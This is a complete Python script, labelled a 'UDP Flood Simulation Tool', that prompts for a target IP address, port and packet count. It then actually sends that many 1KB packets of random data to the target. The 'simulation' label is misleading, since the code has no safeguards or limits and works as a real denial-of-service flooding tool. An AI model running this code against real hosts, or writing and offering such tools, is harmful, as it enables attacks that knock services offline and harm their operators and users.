#!/usr/bin/env python3
import socket
import random
import sys

def udp_flood_simulation():
    print("UDP Flood Simulation Tool")
    print("=" * 40)

    try:
        # Get target IP
        target_ip = input("Enter target IP address: ").strip()

        # Get target port
        target_port = int(input("Enter target UDP port: ").strip())

        # Get number of packets
        num_packets = int(input("Enter number of 1KB packets to send: ").strip())

        # Create UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Set socket timeout (optional)
        sock.settimeout(0.5)

        print(f"\nStarting UDP flood simulation on {target_ip}:{target_port}")
        print(f"Sending {num_packets} packets of 1KB each...")

        packets_sent = 0

        for i in range(num_packets):
            try:
                # Generate 1024 random bytes (1KB)
                data = random.randbytes(1024)

                # Send UDP packet
                sock.sendto(data, (target_ip, target_port))
                packets_sent += 1

                # Print progress every 100 packets
                if (i + 1) % 100 == 0:
                    print(f"Sent {i + 1}/{num_packets} packets...")

            except socket.error as e:
                print(f"Socket error: {e}")
                break
            except KeyboardInterrupt:
                print("\nSimulation interrupted by user.")
                break

        sock.close()
        print(f"\nSimulation completed.")
        print(f"Successfully sent {packets_sent} packets.")

    except ValueError:
        print("Error: Port and packet count must be valid numbers.")
    except socket.gaierror:
        print("Error: Invalid IP address.")
    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == "__main__":
    udp_flood_simulation()
